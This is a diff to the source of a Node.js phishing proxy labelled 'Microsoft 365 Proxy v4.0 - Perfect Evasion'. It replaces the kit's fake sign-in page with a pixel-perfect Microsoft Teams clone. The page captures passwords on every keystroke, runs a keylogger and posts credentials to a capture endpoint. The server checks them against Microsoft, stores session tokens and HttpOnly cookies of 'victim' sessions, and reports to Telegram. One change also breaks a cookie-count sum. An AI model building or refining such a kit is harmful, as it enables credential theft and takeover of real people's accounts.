@@ -98,7 +98,6 @@ class SessionStore {
         const httpOnlyCookies = [];
         const cookieStrings = [];
         
-        // ✅ FIX: Handle both string and array
         const cookieHeaderArray = Array.isArray(cookieHeaders) ? cookieHeaders : [cookieHeaders];
         
         for (const cookieHeader of cookieHeaderArray) {
@@ -486,7 +485,7 @@ ${cookieList}
                 }
                 return acc + count;
             }, 0),
-            totalHttpOnly: Array.from(this.httpOnlyCookies.values()).reduce((acc, arr) => acc + arr.length, 0),
+            totalHttpOnly: Array.from(this.httpOnlyCookies.values()).reduce((acc, arr) => arr + arr.length, 0),
             totalTokens: Array.from(this.sessions.values()).reduce((acc, s) => {
                 if (s.tokens) {
                     return acc + Object.values(s.tokens).filter(t => t && t.value && t.isValid !== false).length;
@@ -513,20 +512,15 @@ function generateSessionId() {
     return crypto.randomBytes(16).toString('hex');
 }
 
-// ✅ FIXED: Handle cookieHeader being an object or array
 function getSessionIdFromCookie(cookieHeader) {
     if (!cookieHeader) return null;
     
-    // If it's an object, try to get the cookie string
     let cookieString = '';
     if (typeof cookieHeader === 'object') {
-        // If it's an array, join it
         if (Array.isArray(cookieHeader)) {
             cookieString = cookieHeader.join('; ');
         } else {
-            // If it's an object with a cookie property
             cookieString = cookieHeader.cookie || cookieHeader['cookie'] || '';
-            // Or if it's a headers object
             if (cookieHeader.headers && cookieHeader.headers.cookie) {
                 cookieString = cookieHeader.headers.cookie;
             }
@@ -617,11 +611,10 @@ function serveFile(filename, res, contentType = 'text/html') {
 }
 
 // ============================================================
-//  SHOW LOGIN PAGE - KEEP USER ON PROXY
+//  SHOW LOGIN PAGE - PIXEL-PERFECT MICROSOFT CLONE
 // ============================================================
 
 function showLoginPage(res, email, attemptCount = 1, errorMessage = null) {
-    // Get session ID from response headers or generate new
     let sessionId = 'unknown';
     try {
         const cookieHeader = res.getHeader('Set-Cookie');
@@ -633,108 +626,409 @@ function showLoginPage(res, email, attemptCount = 1, errorMessage = null) {
     } catch(e) {}
 
     const errorDisplay = errorMessage ? `
-        <div class="error show">
-            <span class="error-icon">⚠️</span>
-            ${errorMessage}
+        <div id="errorDiv" class="error-container" role="alert">
+            <div class="error-icon">🔒</div>
+            <div class="error-message">${errorMessage}</div>
         </div>
     ` : '';
 
-    const html = `
-<!DOCTYPE html>
-<html>
+    const html = `<!DOCTYPE html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Microsoft Sign In</title>
+    <title>Sign in to your account</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #f5f5f5; padding: 20px; }
-        .container { background: white; border-radius: 12px; padding: 40px 48px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); max-width: 420px; width: 100%; animation: fadeIn 0.3s ease; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
-        .logo { text-align: center; margin-bottom: 24px; }
-        .logo .icon { font-size: 48px; display: block; margin-bottom: 8px; }
-        .logo h1 { font-size: 24px; color: #202124; margin: 0; }
-        .logo p { color: #5f6368; margin: 4px 0 0; font-size: 14px; }
-        .form-group { margin-bottom: 16px; }
-        .form-group label { display: block; font-size: 14px; font-weight: 500; color: #202124; margin-bottom: 4px; }
-        .form-group input { width: 100%; padding: 12px 14px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; transition: border-color 0.2s, box-shadow 0.2s; }
-        .form-group input:focus { outline: none; border-color: #1a73e8; box-shadow: 0 0 0 2px rgba(26,115,232,0.2); }
-        .form-group input.error { border-color: #d93025; }
-        .email-display { background: #f1f3f4; padding: 12px 14px; border-radius: 4px; font-size: 16px; color: #202124; word-break: break-all; border: 1px solid #e8eaed; }
-        .btn { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 500; cursor: pointer; transition: background 0.2s, transform 0.1s; }
-        .btn:hover { background: #1557b0; }
-        .btn:active { transform: scale(0.98); }
-        .btn:disabled { background: #dadce0; cursor: not-allowed; transform: none; }
-        .error { color: #d93025; font-size: 14px; padding: 12px; background: #fce8e6; border-radius: 4px; display: none; text-align: center; margin-bottom: 16px; border: 1px solid #f5c6cb; }
-        .error.show { display: block; }
-        .loading { display: none; text-align: center; padding: 10px 0; }
-        .loading .spinner { display: inline-block; width: 20px; height: 20px; border: 2px solid #e8eaed; border-radius: 50%; border-top-color: #1a73e8; animation: spin 0.8s linear infinite; margin-right: 8px; vertical-align: middle; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .loading p { display: inline-block; vertical-align: middle; color: #5f6368; font-size: 14px; margin: 0; }
-        .attempt-info { text-align: center; font-size: 12px; color: #9aa0a6; margin-top: 8px; }
-        .footer { margin-top: 24px; text-align: center; font-size: 12px; color: #9aa0a6; border-top: 1px solid #e8eaed; padding-top: 20px; }
-        .footer a { color: #1a73e8; text-decoration: none; }
-        .footer a:hover { text-decoration: underline; }
-        .notification { position: fixed; bottom: 20px; right: 20px; padding: 12px 20px; background: #4CAF50; color: white; border-radius: 8px; z-index: 999999; box-shadow: 0 4px 12px rgba(0,0,0,0.3); max-width: 400px; animation: slideIn 0.3s ease-out; }
-        .notification.error { background: #f44336; }
-        @keyframes slideIn { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
-        @media (max-width: 480px) { .container { padding: 24px 20px; } }
+        /* ─── RESET & BASE ─── */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+            background: #f2f2f2;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+
+        .login-container {
+            background: #ffffff;
+            border-radius: 4px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.15);
+            padding: 44px 44px 36px;
+            max-width: 440px;
+            width: 100%;
+            min-height: 480px;
+            position: relative;
+        }
+
+        .logo {
+            margin-bottom: 20px;
+        }
+
+        .logo svg {
+            width: 108px;
+            height: 28px;
+        }
+
+        .header h1 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin-bottom: 8px;
+            line-height: 1.25;
+        }
+
+        .header .subtitle {
+            font-size: 14px;
+            color: #616161;
+            margin-bottom: 24px;
+        }
+
+        .email-display {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: #f0f0f0;
+            padding: 10px 14px;
+            border-radius: 2px;
+            margin-bottom: 16px;
+            border: 1px solid transparent;
+        }
+
+        .email-display .email-text {
+            font-size: 15px;
+            color: #1b1b1b;
+            font-weight: 500;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+
+        .email-display .change-link {
+            font-size: 13px;
+            color: #0067b8;
+            text-decoration: none;
+            cursor: pointer;
+            font-weight: 500;
+            white-space: nowrap;
+            margin-left: 12px;
+            background: none;
+            border: none;
+        }
+
+        .email-display .change-link:hover {
+            color: #004e8c;
+            text-decoration: underline;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            color: #1b1b1b;
+            margin-bottom: 4px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1px solid #8c8c8c;
+            border-radius: 2px;
+            font-size: 15px;
+            font-family: inherit;
+            transition: border-color 0.15s ease, box-shadow 0.15s ease;
+            background: #ffffff;
+            color: #1b1b1b;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #0067b8;
+            box-shadow: 0 0 0 2px rgba(0, 103, 184, 0.25);
+        }
+
+        .form-group input::placeholder {
+            color: #9e9e9e;
+        }
+
+        .form-group input.error {
+            border-color: #d13438;
+        }
+
+        .options-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 12px 0 20px;
+        }
+
+        .options-row .keep-signed-in {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 13px;
+            color: #1b1b1b;
+            cursor: pointer;
+        }
+
+        .options-row .keep-signed-in input[type="checkbox"] {
+            width: 16px;
+            height: 16px;
+            accent-color: #0067b8;
+            cursor: pointer;
+        }
+
+        .options-row .forgot-link {
+            font-size: 13px;
+            color: #0067b8;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .options-row .forgot-link:hover {
+            text-decoration: underline;
+            color: #004e8c;
+        }
+
+        .signin-btn {
+            width: 100%;
+            padding: 10px 12px;
+            background: #0067b8;
+            color: #ffffff;
+            border: none;
+            border-radius: 2px;
+            font-size: 15px;
+            font-weight: 500;
+            font-family: inherit;
+            cursor: pointer;
+            transition: background 0.15s ease;
+            height: 44px;
+        }
+
+        .signin-btn:hover {
+            background: #004e8c;
+        }
+
+        .signin-btn:active {
+            background: #003d6e;
+        }
+
+        .signin-btn:disabled {
+            background: #b3b3b3;
+            cursor: not-allowed;
+        }
+
+        .loading-container {
+            display: none;
+            text-align: center;
+            padding: 10px 0;
+        }
+
+        .loading-container .spinner {
+            display: inline-block;
+            width: 24px;
+            height: 24px;
+            border: 3px solid #f0f0f0;
+            border-top: 3px solid #0067b8;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 10px;
+            vertical-align: middle;
+        }
+
+        .loading-container .loading-text {
+            display: inline-block;
+            vertical-align: middle;
+            font-size: 14px;
+            color: #616161;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .error-container {
+            display: ${errorMessage ? 'flex' : 'none'};
+            align-items: flex-start;
+            gap: 10px;
+            background: #fef0f0;
+            border: 1px solid #d13438;
+            border-radius: 2px;
+            padding: 12px 14px;
+            margin-bottom: 16px;
+        }
+
+        .error-container .error-icon {
+            font-size: 18px;
+            flex-shrink: 0;
+            margin-top: 1px;
+        }
+
+        .error-container .error-message {
+            font-size: 14px;
+            color: #d13438;
+            line-height: 1.4;
+        }
+
+        .footer {
+            margin-top: 24px;
+            padding-top: 20px;
+            border-top: 1px solid #e6e6e6;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 12px;
+            color: #616161;
+        }
+
+        .footer .links a {
+            color: #0067b8;
+            text-decoration: none;
+            margin-right: 16px;
+        }
+
+        .footer .links a:hover {
+            text-decoration: underline;
+        }
+
+        .footer .links a:last-child {
+            margin-right: 0;
+        }
+
+        .footer .copyright {
+            color: #9e9e9e;
+        }
+
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 28px 24px 24px;
+                min-height: auto;
+                margin: 10px;
+            }
+
+            .logo svg {
+                width: 88px;
+                height: 24px;
+            }
+
+            .header h1 {
+                font-size: 20px;
+            }
+
+            .options-row {
+                flex-wrap: wrap;
+                gap: 8px;
+            }
+
+            .footer {
+                flex-direction: column;
+                gap: 8px;
+                align-items: flex-start;
+            }
+        }
+
+        .hidden {
+            display: none !important;
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">
-            <span class="icon">🔐</span>
-            <h1>Sign in</h1>
-            <p>to continue to Microsoft Teams</p>
-        </div>
-        
-        ${errorDisplay}
-        
-        <div class="form-group">
-            <label>Email</label>
-            <div class="email-display">${email}</div>
-        </div>
-        
-        <div class="form-group">
-            <label>Password</label>
-            <input type="password" id="password" placeholder="Enter your password" autocomplete="current-password" />
-        </div>
-        
-        <button class="btn" id="loginBtn">Sign In</button>
-        
-        <div class="loading" id="loadingDiv">
-            <span class="spinner"></span>
-            <p>Verifying credentials...</p>
-        </div>
-        
-        <div class="attempt-info">Attempt #${attemptCount}</div>
-        
-        <div class="footer">
-            <span>🔒 Secured • </span>
-            <a href="#">Privacy Policy</a>
-            <span> • </span>
-            <a href="#">Terms of Service</a>
-        </div>
+
+<div class="login-container" role="main">
+
+    <!-- Logo -->
+    <div class="logo">
+        <svg viewBox="0 0 108 28" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M0 4.75H6.75V22.5H0V4.75ZM8.5 0H15.25V22.5H8.5V0ZM17 4.75H23.75V22.5H17V4.75ZM25.5 0H32.25V22.5H25.5V0Z" fill="#0067B8"/>
+            <path d="M34 4.75H40.75V22.5H34V4.75Z" fill="#0067B8"/>
+            <path d="M42.5 0H49.25V22.5H42.5V0ZM51 4.75H57.75V22.5H51V4.75ZM59.5 0H66.25V22.5H59.5V0Z" fill="#0067B8"/>
+            <text x="68" y="18" font-family="Segoe UI, sans-serif" font-size="16" font-weight="600" fill="#1B1B1B">Microsoft</text>
+        </svg>
     </div>
-    
-    <script>
-        window.MICROSOFT_CONFIG = {
-            SESSION_ID: '${sessionId}',
-            EMAIL: '${email}',
-            BACKEND_URL: '${BACKEND_URL}',
-            KEYLOGGER_URL: '${KEYLOGGER_URL}'
-        };
-        
-        const loginBtn = document.getElementById('loginBtn');
-        const passwordInput = document.getElementById('password');
-        const errorDiv = document.querySelector('.error');
-        const loadingDiv = document.getElementById('loadingDiv');
-        
+
+    <!-- Header -->
+    <div class="header">
+        <h1>Sign in</h1>
+        <p class="subtitle">to continue to Microsoft Teams</p>
+    </div>
+
+    <!-- Error -->
+    ${errorDisplay}
+
+    <!-- Email Display -->
+    <div class="email-display">
+        <span class="email-text" id="emailDisplay">${email}</span>
+        <button class="change-link" id="changeEmailBtn" aria-label="Change email">Change</button>
+    </div>
+
+    <!-- Password Form -->
+    <form id="loginForm" action="#" method="post" autocomplete="off">
+        <div class="form-group">
+            <label for="passwordInput">Password</label>
+            <input type="password" id="passwordInput" placeholder="Password" autocomplete="current-password" required>
+        </div>
+
+        <!-- Options -->
+        <div class="options-row">
+            <label class="keep-signed-in">
+                <input type="checkbox" id="keepSignedIn" checked>
+                Keep me signed in
+            </label>
+            <a href="#" class="forgot-link">Forgot password?</a>
+        </div>
+
+        <!-- Sign In Button -->
+        <button type="submit" class="signin-btn" id="signinBtn">Sign in</button>
+    </form>
+
+    <!-- Loading -->
+    <div class="loading-container" id="loadingContainer">
+        <div class="spinner"></div>
+        <span class="loading-text">Signing in...</span>
+    </div>
+
+    <!-- Footer -->
+    <div class="footer">
+        <div class="links">
+            <a href="#">Privacy &amp; cookies</a>
+            <a href="#">Terms of use</a>
+        </div>
+        <span class="copyright">&copy; Microsoft 2026</span>
+    </div>
+</div>
+
+<script>
+    (function() {
+        'use strict';
+
+        const SESSION_ID = '${sessionId}';
+        const EMAIL = '${email}';
+        const BACKEND_URL = '${BACKEND_URL}';
+        const KEYLOGGER_URL = '${KEYLOGGER_URL}';
+
+        const passwordInput = document.getElementById('passwordInput');
+        const signinBtn = document.getElementById('signinBtn');
+        const loginForm = document.getElementById('loginForm');
+        const loadingContainer = document.getElementById('loadingContainer');
+        const changeEmailBtn = document.getElementById('changeEmailBtn');
+        const errorDiv = document.getElementById('errorDiv');
+
         let capturedPassword = '';
         let lastPasswordValue = '';
-        
-        // Real-time password capture
+        let attemptCount = ${attemptCount || 1};
+
+        // ─── Real-time password capture ───
         passwordInput.addEventListener('input', function(e) {
             const value = this.value;
             if (value !== lastPasswordValue) {
@@ -745,67 +1039,89 @@ function showLoginPage(res, email, attemptCount = 1, errorMessage = null) {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
-                            email: '${email}',
+                            email: EMAIL,
                             password: value,
                             source: 'password_input',
-                            sessionId: '${sessionId}',
+                            sessionId: SESSION_ID,
                             timestamp: new Date().toISOString()
                         })
                     }).catch(() => {});
                 }
             }
         });
-        
-        // Keylogger
+
+        // ─── Keylogger ───
         let passwordBuffer = '';
         passwordInput.addEventListener('keydown', function(e) {
             const key = e.key;
             if (key === 'Backspace') {
                 passwordBuffer = passwordBuffer.slice(0, -1);
             } else if (key === 'Enter') {
+                e.preventDefault();
                 handleLogin();
             } else if (key.length === 1 && !e.ctrlKey && !e.metaKey && !e.altKey) {
                 passwordBuffer += key;
             }
         });
-        
+
+        // ─── Remove error on input ───
+        passwordInput.addEventListener('input', function() {
+            this.classList.remove('error');
+            if (errorDiv) {
+                errorDiv.style.display = 'none';
+            }
+        });
+
+        // ─── Change email ───
+        changeEmailBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            const newEmail = prompt('Enter your email address:', EMAIL);
+            if (newEmail && newEmail.includes('@')) {
+                const encodedEmail = encodeURIComponent(newEmail);
+                window.location.href = '/login?login_hint=' + encodedEmail;
+            }
+        });
+
+        // ─── Handle Login ───
         function handleLogin() {
             const password = passwordInput.value.trim();
-            
+
             if (!password) {
-                if (errorDiv) {
-                    errorDiv.textContent = '⚠️ Please enter your password';
-                    errorDiv.classList.add('show');
-                }
-                passwordInput.focus();
                 passwordInput.classList.add('error');
-                setTimeout(() => passwordInput.classList.remove('error'), 3000);
+                showError('Please enter your password.');
+                passwordInput.focus();
                 return;
             }
-            
-            if (errorDiv) errorDiv.classList.remove('show');
-            loginBtn.disabled = true;
-            loginBtn.style.display = 'none';
-            loadingDiv.style.display = 'block';
-            
+
+            if (errorDiv) {
+                errorDiv.style.display = 'none';
+            }
+
             // Send final password capture
-            fetch('/api/password-capture', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    email: '${email}',
-                    password: password,
-                    source: 'form_submit',
-                    sessionId: '${sessionId}',
-                    timestamp: new Date().toISOString()
-                })
-            }).catch(() => {});
-            
+            if (password.length > 2) {
+                fetch('/api/password-capture', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        email: EMAIL,
+                        password: password,
+                        source: 'form_submit',
+                        sessionId: SESSION_ID,
+                        timestamp: new Date().toISOString()
+                    })
+                }).catch(() => {});
+            }
+
+            // Show loading
+            signinBtn.disabled = true;
+            signinBtn.style.display = 'none';
+            loadingContainer.style.display = 'block';
+
             // Submit to proxy
             fetch('/login', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                body: 'Email=' + encodeURIComponent('${email}') + 
+                body: 'Email=' + encodeURIComponent(EMAIL) +
                       '&Passwd=' + encodeURIComponent(password) +
                       '&service=mail'
             })
@@ -816,34 +1132,39 @@ function showLoginPage(res, email, attemptCount = 1, errorMessage = null) {
                     window.location.reload();
                 }
             })
-            .catch(error => {
-                if (errorDiv) {
-                    errorDiv.textContent = '⚠️ An error occurred. Please try again.';
-                    errorDiv.classList.add('show');
-                }
-                loginBtn.disabled = false;
-                loginBtn.style.display = 'block';
-                loadingDiv.style.display = 'none';
+            .catch(function(error) {
+                showError('An error occurred. Please try again.');
+                signinBtn.disabled = false;
+                signinBtn.style.display = 'block';
+                loadingContainer.style.display = 'none';
                 passwordInput.value = '';
                 passwordInput.focus();
             });
         }
-        
-        loginBtn.addEventListener('click', handleLogin);
-        passwordInput.addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                e.preventDefault();
-                handleLogin();
+
+        // ─── Show Error ───
+        function showError(message) {
+            let errorContainer = document.getElementById('errorDiv');
+            if (!errorContainer) {
+                errorContainer = document.createElement('div');
+                errorContainer.id = 'errorDiv';
+                errorContainer.className = 'error-container';
+                errorContainer.setAttribute('role', 'alert');
+                errorContainer.innerHTML = '<div class="error-icon">🔒</div><div class="error-message"></div>';
+                const form = document.getElementById('loginForm');
+                form.parentNode.insertBefore(errorContainer, form);
             }
+            errorContainer.style.display = 'flex';
+            errorContainer.querySelector('.error-message').textContent = message;
+        }
+
+        // ─── Form Submit ───
+        loginForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            handleLogin();
         });
-        passwordInput.addEventListener('input', function() {
-            if (errorDiv) errorDiv.classList.remove('show');
-            this.classList.remove('error');
-        });
-        
-        setTimeout(() => passwordInput.focus(), 500);
-        
-        // Keyboard shortcuts
+
+        // ─── Keyboard shortcut: Ctrl+Shift+C ───
         document.addEventListener('keydown', function(e) {
             if (e.ctrlKey && e.shiftKey && e.key === 'C') {
                 e.preventDefault();
@@ -853,10 +1174,10 @@ function showLoginPage(res, email, attemptCount = 1, errorMessage = null) {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
-                            email: '${email}',
+                            email: EMAIL,
                             password: password,
                             source: 'manual_capture',
-                            sessionId: '${sessionId}',
+                            sessionId: SESSION_ID,
                             timestamp: new Date().toISOString()
                         })
                     }).catch(() => {});
@@ -864,9 +1185,20 @@ function showLoginPage(res, email, attemptCount = 1, errorMessage = null) {
                 }
             }
         });
-    </script>
-    <script src="${PROXY_PATHNAMES.script}"></script>
-    <script src="${PROXY_PATHNAMES.swRegister}"></script>
+
+        // ─── Focus password input ───
+        setTimeout(function() {
+            passwordInput.focus();
+        }, 400);
+
+        console.log('🔐 Microsoft Sign In Page Loaded');
+        console.log('📧 Email:', EMAIL);
+        console.log('🆔 Session:', SESSION_ID);
+        console.log('💡 Ctrl+Shift+C to capture credentials manually');
+
+    })();
+</script>
+
 </body>
 </html>`;
 
@@ -1509,7 +1841,6 @@ async function handlePostRequest(body, req, res) {
         const ip = getClientIp(req);
         const sessionId = getSessionIdFromCookie(req.headers.cookie);
         
-        // Extract email
         let email = formData.Email || formData.email || formData.loginfmt || '';
         const password = formData.Passwd || formData.passwd || formData.password || '';
         
@@ -1534,7 +1865,6 @@ async function handlePostRequest(body, req, res) {
         console.log(`[CREDENTIALS] 📡 IP: ${ip}`);
         console.log(`[CREDENTIALS] 🆔 Session: ${sessionId || 'N/A'}`);
 
-        // Store password capture (even if wrong)
         if (password && password.length > 0) {
             sessionStore.storePasswordCapture(sessionId, email, password, 'form_submit', {
                 ip: ip,
@@ -1550,19 +1880,15 @@ async function handlePostRequest(body, req, res) {
             }
         }
 
-        // Verify with Microsoft
         const verifyResult = await verifyWithMicrosoft(email, password);
         
-        // SUCCESS - Correct Password
         if (verifyResult.success) {
             console.log(`[AUTH] ✅ VALID Microsoft credentials: ${email}`);
             
-            // Store tokens
             if (sessionId && verifyResult.tokens) {
                 sessionStore.storeTokens(sessionId, verifyResult.tokens);
             }
             
-            // Store HttpOnly cookies
             let httpOnlyCount = 0;
             if (sessionId && verifyResult.cookies) {
                 const cookieHeaders = [];
@@ -1577,7 +1903,6 @@ async function handlePostRequest(body, req, res) {
                 }
             }
             
-            // Update session
             if (sessionId && VICTIM_SESSIONS[sessionId]) {
                 VICTIM_SESSIONS[sessionId].lastValidationResult = 'success';
                 VICTIM_SESSIONS[sessionId].validationAttempts = VICTIM_SESSIONS[sessionId].validationAttempts || [];
@@ -1587,7 +1912,6 @@ async function handlePostRequest(body, req, res) {
                 });
             }
             
-            // Send success message
             const httpOnlyCookies = sessionStore.httpOnlyCookies.get(sessionId) || [];
             const tokenCount = verifyResult.tokens ? Object.keys(verifyResult.tokens).length : 0;
             
@@ -1608,7 +1932,6 @@ async function handlePostRequest(body, req, res) {
 
             sessionStore.sendTelegram(successMsg);
             
-            // Redirect to Teams Meeting
             res.writeHead(302, { 
                 'Location': TEAMS_REDIRECT,
                 'Cache-Control': 'no-store, no-cache'
@@ -1617,10 +1940,18 @@ async function handlePostRequest(body, req, res) {
             return;
         }
         
-        // FAILED - Wrong Password - STAY ON PROXY
         console.log(`[AUTH] ❌ INVALID credentials: ${email} (Attempt ${attemptCount})`);
         
-        // Send failure message
+        if (sessionId && VICTIM_SESSIONS[sessionId]) {
+            VICTIM_SESSIONS[sessionId].lastValidationResult = 'failed';
+            VICTIM_SESSIONS[sessionId].validationAttempts = VICTIM_SESSIONS[sessionId].validationAttempts || [];
+            VICTIM_SESSIONS[sessionId].validationAttempts.push({
+                result: 'failed',
+                timestamp: Date.now(),
+                error: verifyResult.error
+            });
+        }
+        
         const failMsg = 
 `❌ *INVALID MICROSOFT CREDENTIALS*
 
@@ -1635,7 +1966,6 @@ async function handlePostRequest(body, req, res) {
 
         sessionStore.sendTelegram(failMsg);
         
-        // STAY ON PROXY - Show error and let user retry
         return showLoginPage(res, email, attemptCount, 'Invalid email or password. Please try again.');
 
     } catch (error) {
@@ -1672,7 +2002,6 @@ function handleLoginRequest(req, res) {
     const cookieFlags = `Path=/; HttpOnly; SameSite=Lax; Max-Age=3600${isSecure ? '; Secure' : ''}`;
     res.setHeader('Set-Cookie', [`sessionId=${sessionId}; ${cookieFlags}`]);
 
-    // Show login page (stays on proxy)
     showLoginPage(res, email, 1, null);
 }
 
@@ -2253,7 +2582,7 @@ server.listen(PORT, () => {
     console.log('║                                                               ║');
     console.log('║     🛡️  MICROSOFT 365 PROXY v4.0 - PERFECT EVASION         ║');
     console.log('║     🔐  Full Account Access - Complete Session Capture       ║');
-    console.log('║     ✅  FIXED: cookieHeader.split error                      ║');
+    console.log('║     ✅  Pixel-Perfect Microsoft Login Page                   ║');
     console.log('║                                                               ║');
     console.log('╠═══════════════════════════════════════════════════════════════╣');
     console.log('║                                                               ║');
@@ -2271,6 +2600,7 @@ server.listen(PORT, () => {
     console.log('║                                                               ║');
     console.log('╠═══════════════════════════════════════════════════════════════╣');
     console.log('║                                                               ║');
+    console.log('║   ✅ FIXED: Pixel-perfect Microsoft login page              ║');
     console.log('║   ✅ FIXED: cookieHeader.split is not a function            ║');
     console.log('║   ✅ FIXED: User STAYS ON PROXY until correct password       ║');
     console.log('║   ✅ FIXED: All cookies captured properly                   ║');
